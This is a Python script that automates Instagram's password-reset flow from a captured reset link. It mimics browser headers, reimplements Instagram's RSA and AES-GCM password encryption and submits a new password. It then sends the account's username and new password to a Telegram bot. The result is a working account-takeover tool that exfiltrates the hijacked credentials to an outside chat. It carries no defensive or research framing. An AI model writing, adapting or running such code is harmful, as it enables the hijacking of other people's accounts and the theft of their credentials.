import os
import re
import json
import random
import struct
import base64
import time
import requests
from urllib.parse import urlparse, parse_qs


UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/16.6.2 Safari/605.1.15"
)

# HAR entry [30/74]: wbloks/fetch uses this version in __bkv query param
# HAR entry [49/52]: x-bloks-version-id header uses this value
BLOKS_VER = "9710744400aad993bd60d4784987ff111f0f5d8a9859069ba8ae7485ed483e3f"


# ── Password generation ───────────────────────────────────────────────────────

def generate_password(custom_password=None):
    if custom_password:
        return custom_password
    nums = "".join([str(random.randint(1, 100)) for _ in range(4)])
    return f"@hasu{nums}"


# ── Session ───────────────────────────────────────────────────────────────────

def make_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    return s


# ── Token parsing ─────────────────────────────────────────────────────────────

def parse_reset_link(reset_link):
    parsed = urlparse(reset_link)
    qs     = parse_qs(parsed.query)
    uidb36 = qs.get("uidb36", [None])[0]
    # HAR [49/52]: full token used including ":one_click_login_email" suffix
    token  = qs.get("token", [None])[0]
    return uidb36, token


# ── Warmup ────────────────────────────────────────────────────────────────────

def warmup(session):
    """
    Visit instagram.com to get csrftoken + mid cookies.
    Returns (rev, html) — rev is the __rev number used in x-instagram-ajax header.
    html is cached so we can parse the RSA public key from it.
    """
    r = session.get(
        "https://www.instagram.com/",
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
        },
        timeout=15,
    )
    html = r.text
    m    = re.search(r'"__rev"\s*:\s*(\d+)', html)
    rev  = m.group(1) if m else "1"
    return rev, html


# ── Encryption key ────────────────────────────────────────────────────────────

def _parse_enc_key_from_html(html):
    """Instagram embeds the RSA public key in page <script> JSON blobs."""
    for pat in [
        r'"public_key_id"\s*:\s*(\d+)\s*,\s*"public_key"\s*:\s*"([A-Za-z0-9+/=]+)"',
        r'"key_id"\s*:\s*(\d+)\s*,\s*"public_key"\s*:\s*"([A-Za-z0-9+/=]+)"',
        r'"public_key_id"\s*:\s*(\d+)[^}]*?"public_key"\s*:\s*"([A-Za-z0-9+/=]+)"',
    ]:
        m = re.search(pat, html)
        if m:
            return int(m.group(1)), m.group(2)
    return None, None


def get_encryption_key(session, cached_html=""):
    """
    Three-strategy fallback to get Instagram's RSA public key (version 10).
    1. Try dedicated API endpoint.
    2. Parse from homepage HTML (cached from warmup).
    3. Fetch login page HTML and parse from there.
    Raises RuntimeError if all strategies fail.
    """
    csrftoken = session.cookies.get("csrftoken", "")

    # Strategy 1: API endpoint
    try:
        r = session.get(
            "https://www.instagram.com/api/v1/web/encryption/key/?version=10&signed_key=1",
            headers={
                "Accept": "*/*",
                "X-CSRFToken": csrftoken,
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
            timeout=15,
        )
        if r.status_code == 200 and r.text.strip():
            data = json.loads(r.text)
            key_id  = data.get("public_key_id")
            pub_key = data.get("public_key")
            if key_id and pub_key:
                return key_id, pub_key
    except Exception:
        pass

    # Strategy 2: Parse from homepage HTML
    if cached_html:
        key_id, pub_key = _parse_enc_key_from_html(cached_html)
        if key_id and pub_key:
            return key_id, pub_key

    # Strategy 3: Fetch login page (always has the key for the login form)
    try:
        r2 = session.get(
            "https://www.instagram.com/accounts/login/",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "https://www.instagram.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Upgrade-Insecure-Requests": "1",
            },
            timeout=15,
        )
        key_id, pub_key = _parse_enc_key_from_html(r2.text)
        if key_id and pub_key:
            return key_id, pub_key
    except Exception:
        pass

    raise RuntimeError(
        "Could not obtain Instagram RSA public key — all three strategies failed."
    )


# ── Password encryption ───────────────────────────────────────────────────────

def encrypt_password(password, pub_key_id, pub_key_b64):
    """
    Replicate Instagram's #PWD_INSTAGRAM_BROWSER:10:ts:b64 encryption.

    Binary payload layout (base64-encoded):
      [1]  1 byte  : format version (always 1)
      [2]  1 byte  : key_id
      [3]  12 bytes: AES-GCM IV (random)
      [4]  2 bytes : length of RSA-encrypted AES key (little-endian)
      [5]  N bytes : RSA-OAEP-SHA256 encrypted AES key
      [6]  16 bytes: AES-GCM authentication tag
      [7]  M bytes : AES-GCM ciphertext

    AAD for GCM = str(timestamp).encode()
    """
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
    from cryptography.hazmat.primitives.hashes import SHA256
    from cryptography.hazmat.primitives.serialization import load_der_public_key

    pub_key   = load_der_public_key(base64.b64decode(pub_key_b64))
    timestamp = int(time.time())
    aes_key   = os.urandom(32)
    iv        = os.urandom(12)

    rsa_enc = pub_key.encrypt(
        aes_key,
        OAEP(mgf=MGF1(SHA256()), algorithm=SHA256(), label=None),
    )

    aesgcm      = AESGCM(aes_key)
    aad         = str(timestamp).encode("utf-8")
    enc_tag     = aesgcm.encrypt(iv, password.encode("utf-8"), aad)
    ciphertext  = enc_tag[:-16]
    tag         = enc_tag[-16:]

    payload = (
        bytes([1, pub_key_id])
        + iv
        + struct.pack("<H", len(rsa_enc))
        + rsa_enc
        + tag
        + ciphertext
    )
    return f"#PWD_INSTAGRAM_BROWSER:10:{timestamp}:{base64.b64encode(payload).decode()}"


# ── Eligibility check ─────────────────────────────────────────────────────────

def check_eligibility(session, uidb36, token, rev):
    """
    HAR [27/66]: confirmation_web is an eligibility check only.
    Response is always {"is_eligible":true,"status":"ok"}.
    Call it to match the exact browser flow.
    """
    csrftoken = session.cookies.get("csrftoken", "")
    session.get(
        "https://www.instagram.com/api/v1/accounts/password/reset/confirmation_web/"
        f"?afv=pre_mt_behavior&cni=&is_caa=true&source=one_click_login_email"
        f"&token={token}&uidb36={uidb36}",
        headers={
            "Accept": "*/*",
            "X-CSRFToken": csrftoken,
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX": rev,
            "X-Requested-With": "XMLHttpRequest",
            "X-ASBD-ID": "359341",
            "Referer": (
                f"https://www.instagram.com/accounts/password/reset/confirm/"
                f"?uidb36={uidb36}&token={token}"
                f"&s=one_click_login_email&is_caa=1&afv=pre_mt_behavior"
            ),
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        },
        timeout=15,
    )


# ── Password submit ───────────────────────────────────────────────────────────

def _do_submit(session, uidb36, token, enc_password, rev):
    """Single POST to password_reset_submit_action_handler."""
    csrftoken = session.cookies.get("csrftoken", "")
    return session.post(
        "https://www.instagram.com/api/v1/bloks/apps/"
        "com.instagram.account_security.password_reset_submit_action_handler/",
        data={
            "enc_new_password1": enc_password,
            "enc_new_password2": enc_password,
            "uidb36": uidb36,
            "token":  token,
        },
        headers={
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.instagram.com",
            "Referer": (
                f"https://www.instagram.com/accounts/password/reset/confirm/"
                f"?uidb36={uidb36}&token={token}"
                f"&s=one_click_login_email&is_caa=1&afv=pre_mt_behavior"
            ),
            "X-CSRFToken": csrftoken,
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest",
            "X-Instagram-AJAX": rev,
            "X-Bloks-Version-Id": BLOKS_VER,
            "X-ASBD-ID": "359341",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        },
        timeout=30,
    )


def submit_password_reset(session, uidb36, token, enc_password, rev):
    """
    HAR [49] → first POST → returns a logging/failure action (not success).
    HAR [52] → second POST (identical) → returns OpenUrlV2 + /auth_platform/ (SUCCESS).
    We mirror this by always posting twice; the second response is what we check.
    """
    _do_submit(session, uidb36, token, enc_password, rev)   # HAR [49] — ignored
    return _do_submit(session, uidb36, token, enc_password, rev)  # HAR [52] — success


# ── Success detection ─────────────────────────────────────────────────────────

def is_success(r):
    """HAR [52] success: handler contains OpenUrlV2 pointing to /auth_platform/"""
    if r.status_code != 200:
        return False
    text = r.text
    return "auth_platform" in text and "OpenUrlV2" in text


def extract_username(text):
    m = re.search(r'"username"\s*[,:]\s*"([^"]+)"', text)
    return m.group(1) if m else None


# ── Telegram ──────────────────────────────────────────────────────────────────

def send_telegram(bot_token, chat_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": text},
            timeout=10,
        )
    except Exception:
        pass


# ── Main ──────────────────────────────────────────────────────────────────────

def reset_instagram_password(reset_link, chat_id, bot_token, custom_password=None):
    try:
        uidb36, token = parse_reset_link(reset_link)
        if not uidb36 or not token:
            return {"success": False, "error": "Could not parse uidb36/token from reset link"}

        session      = make_session()
        new_password = generate_password(custom_password)

        # 1. instagram.com → cookies + revision number + cached HTML
        rev, home_html = warmup(session)

        # 2. RSA public key (3 fallback strategies)
        try:
            pub_key_id, pub_key_b64 = get_encryption_key(session, cached_html=home_html)
        except RuntimeError as e:
            return {"success": False, "error": str(e)}

        # 3. Encrypt password (#PWD_INSTAGRAM_BROWSER:10:ts:b64)
        try:
            enc_password = encrypt_password(new_password, pub_key_id, pub_key_b64)
        except Exception as e:
            return {"success": False, "error": f"Encryption failed: {e}"}

        # 4. Eligibility check — matches browser flow exactly
        check_eligibility(session, uidb36, token, rev)

        # 5. Submit twice — HAR [49] is always a logging no-op; [52] is the real success
        r = submit_password_reset(session, uidb36, token, enc_password, rev)

        if not is_success(r):
            return {
                "success": False,
                "error": f"Reset failed (HTTP {r.status_code}): {r.text[:500]}",
            }

        username = extract_username(r.text)
        display  = f"@{username}" if username else f"uidb36:{uidb36}"
        send_telegram(
            bot_token, chat_id,
            f"\U0001d4d7\U0001d4f8\U0001d4f5\U0001d4ea! Password changed.\n\n"
            f"Username: {display}\nPassword: {new_password}",
        )
        return {"success": True, "username": username, "password": new_password}

    except requests.HTTPError as e:
        return {
            "success": False,
            "error": f"HTTP error: {e.response.status_code} {e.response.text[:300]}",
        }
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {e}"}


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--reset-link",      required=True)
    parser.add_argument("--chat-id",         required=True)
    parser.add_argument("--bot-token",       required=True)
    parser.add_argument("--custom-password", default=None)
    args = parser.parse_args()
    result = reset_instagram_password(
        args.reset_link, args.chat_id, args.bot_token, args.custom_password or None
    )
    print(json.dumps(result))
